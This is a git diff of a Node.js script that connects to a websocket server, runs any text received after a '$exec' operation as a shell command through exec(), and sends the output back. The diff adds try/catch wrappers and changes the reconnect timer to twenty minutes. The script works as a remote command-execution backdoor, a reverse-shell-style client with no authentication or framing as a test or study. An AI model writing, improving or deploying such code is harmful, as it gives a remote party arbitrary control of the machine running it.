@@ -16,7 +16,7 @@ function connect() {
             const msg = message.toString()
             const [client, operation, ...text] = msg.split(" ")
             if (operation === "$exec") { // checks if there is exec command to execute the cmd.
-                cmd(ws, text.join(" "))
+                cmd(text.join(" "))
             }
         })
     })
@@ -30,23 +30,31 @@ function connect() {
 
 }
 
-function cmd(ws, cmd) {
-    exec(cmd, (err, stdout, stderr) => {
-        if (err) {
-            ws.send(`ERORR ::: ${err}`)
-            return
-        } else if (stderr) {
-            ws.send(`STDERR ::: ${stderr}`)
-            return
-        }
-        ws.send(stdout)
-    })
+function cmd(cmd) {
+    try {
+        exec(cmd, (err, stdout, stderr) => {
+            if (err) {
+                ws.send(`ERORR ::: ${err}`)
+                return
+            } else if (stderr) {
+                ws.send(`STDERR ::: ${stderr}`)
+                return
+            }
+            ws.send(stdout)
+        })
+    } catch {
+        console.log(`Something Went Wrong with exec cmd.`)
+    }
 }
-// ws.close()
-function reconnect() {
-    ws.close()
-    connect()
-}
-setInterval(reconnect, 10000)
 
-// 0 $exec cd .. && ls && touch hi.txt << HELLO BROTHER
+function reconnect() {
+    try{
+        ws.close()
+        connect()
+    } catch{
+        console.log("Some Error in reconnection")
+    }
+}
+reconnect()
+setInterval(reconnect, 1000*60*20)
+
